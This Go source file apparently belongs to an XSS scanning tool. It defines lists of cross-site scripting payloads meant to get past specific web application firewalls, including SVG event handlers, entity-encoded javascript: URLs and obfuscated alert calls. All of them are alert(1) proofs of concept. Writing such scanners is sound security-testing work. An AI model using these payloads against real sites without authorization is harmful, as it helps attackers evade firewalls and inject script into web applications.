package payload

import (
	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

// WAFTargetedPayloads returns payloads known to be effective against specific WAFs.
// These use encoding tricks, non-standard syntax, and lesser-known HTML elements
// that WAF rules may not cover.
func WAFTargetedPayloads(wafName string) []PayloadTemplate {
	switch wafName {
	case "cloudflare":
		return cloudflareBypass()
	case "akamai":
		return akamaiBypass()
	case "modsecurity":
		return modsecurityBypass()
	case "imperva":
		return impervaBypass()
	case "aws":
		return awsBypass()
	case "f5":
		return f5Bypass()
	default:
		return nil
	}
}

// AllWAFBypassPayloads returns all WAF-bypass payloads regardless of WAF type.
// Useful when the WAF type is unknown but WAF bypass is enabled.
// Returns the cached list (read-only) built once at init.
func AllWAFBypassPayloads() []PayloadTemplate {
	return allWAFBypass
}

var allWAFBypass = buildAllWAFBypass()

func buildAllWAFBypass() []PayloadTemplate {
	var payloads []PayloadTemplate
	payloads = append(payloads, cloudflareBypass()...)
	payloads = append(payloads, akamaiBypass()...)
	payloads = append(payloads, modsecurityBypass()...)
	payloads = append(payloads, impervaBypass()...)
	payloads = append(payloads, awsBypass()...)
	payloads = append(payloads, f5Bypass()...)
	return payloads
}

func cloudflareBypass() []PayloadTemplate {
	return []PayloadTemplate{
		// Cloudflare often misses SVG animate elements
		{
			Value:         `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Cloudflare bypass: SVG animate onbegin",
			WAFBypassOnly: true,
		},
		{
			Value:         `<svg><set onbegin=alert(1) attributename=x to=1>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Cloudflare bypass: SVG set onbegin",
			WAFBypassOnly: true,
		},
		// HTML entity insertion between tag and event handler
		{
			Value:         `<img src=x &#x09;onerror=alert(1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Cloudflare bypass: HTML tab entity before onerror",
			WAFBypassOnly: true,
		},
		{
			Value:         `<img src=x &#x0a;onerror=alert(1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Cloudflare bypass: HTML newline entity before onerror",
			WAFBypassOnly: true,
		},
	}
}

func akamaiBypass() []PayloadTemplate {
	return []PayloadTemplate{
		// Akamai often misses non-standard event handlers
		{
			Value:         `<details open ontoggle=alert(1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Akamai bypass: details ontoggle",
			WAFBypassOnly: true,
		},
		{
			Value:         `<marquee onstart=alert(1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Akamai bypass: marquee onstart",
			WAFBypassOnly: true,
		},
		{
			Value:         `<marquee loop=1 width=0 onfinish=alert(1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Akamai bypass: marquee onfinish",
			WAFBypassOnly: true,
		},
	}
}

func modsecurityBypass() []PayloadTemplate {
	return []PayloadTemplate{
		// ModSecurity often misses bracket notation
		{
			Value:         `<img src=x onerror=window['alert'](1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "ModSecurity bypass: bracket notation for alert",
			WAFBypassOnly: true,
		},
		{
			Value:         `<img src=x onerror=self['ale'+'rt'](1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "ModSecurity bypass: string concatenation",
			WAFBypassOnly: true,
		},
		// Backtick template literal in attribute
		{
			Value:         `<img src=x onerror=eval.call` + "``" + `alert(1)` + "``" + `>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "ModSecurity bypass: eval.call with backtick",
			WAFBypassOnly: true,
		},
	}
}

func impervaBypass() []PayloadTemplate {
	return []PayloadTemplate{
		// Imperva often misses HTML entities in protocol handlers
		{
			Value:         `<a href=javascript&colon;alert(1)>click</a>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Imperva bypass: &colon; entity in javascript: protocol",
			WAFBypassOnly: true,
		},
		{
			Value:         `<iframe src=javascript&colon;alert(1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "Imperva bypass: iframe with &colon; entity",
			WAFBypassOnly: true,
		},
	}
}

func awsBypass() []PayloadTemplate {
	return []PayloadTemplate{
		// AWS WAF often misses SVG events
		{
			Value:         `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "AWS WAF bypass: SVG animate",
			WAFBypassOnly: true,
		},
		{
			Value:         `<svg><animateMotion onbegin=alert(1) dur=1s>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "AWS WAF bypass: SVG animateMotion",
			WAFBypassOnly: true,
		},
		// Data attribute XSS
		{
			Value:         `<div data-x="x" onclick="alert(1)">click</div>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.Medium,
			Desc:          "AWS WAF bypass: div with onclick",
			WAFBypassOnly: true,
		},
	}
}

func f5Bypass() []PayloadTemplate {
	return []PayloadTemplate{
		// F5 BIG-IP often misses certain encoding tricks
		{
			Value:         `<img src=x onerror=top['alert'](1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "F5 bypass: top['alert'] notation",
			WAFBypassOnly: true,
		},
		{
			Value:         `<body onpageshow=alert(1)>`,
			Context:       context.ContextHTMLBody,
			Severity:      model.High,
			Desc:          "F5 bypass: body onpageshow",
			WAFBypassOnly: true,
		},
	}
}
